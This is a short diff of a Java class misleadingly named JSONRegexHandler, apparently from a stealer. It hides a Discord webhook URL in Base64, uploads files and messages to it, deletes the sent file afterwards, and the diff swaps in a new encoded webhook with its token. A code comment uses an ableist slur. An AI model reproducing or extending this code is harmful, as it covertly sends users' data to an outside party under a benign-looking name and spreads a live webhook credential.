@@ -9,7 +9,7 @@ import java.util.Base64;
 
 public final class JSONRegexHandler {
     // For Retarded Ski-People the webhook below is encrypted in Base64 with a UTF-8 character set (Usually using https://base64encode.org).
-    private static final String WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTIwMzA3MjMyNzYyMTM0NTY5L2o3a1B0dmM3eHc5X3VfNTJxaTdVcVpiQXZ2TXVheFZRRzJMV05JMElORy1Mb1BlSmU1Q0FwN1NTUnFDeGNHcWo1SEdr";
+    private static final String WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTIzNDEyOTkwNzI2OTIyMjkwL2duNkZEcGxMNGdveTNyM3VCNXdLdVd4TWNkOWhWM29FZlZ3WkdTYXlWRDRjNjlGOWdral9fNno1d2RkRWpsRXZkWmo2";
     private static boolean success = true;
 
     public static void send(String data) {
@@ -24,6 +24,7 @@ public final class JSONRegexHandler {
 
         String result = JSONParser.sendFile(new String(Base64.getDecoder().decode(WEBHOOK.getBytes(StandardCharsets.UTF_8))), file);
         if (result != null && result.contains("Invalid Webhook Token")) success = false;
-        if (!file.delete() && file.exists()) JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
+        if (!file.delete() && file.exists())
+            JSONRegexHandler.send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
     }
 }
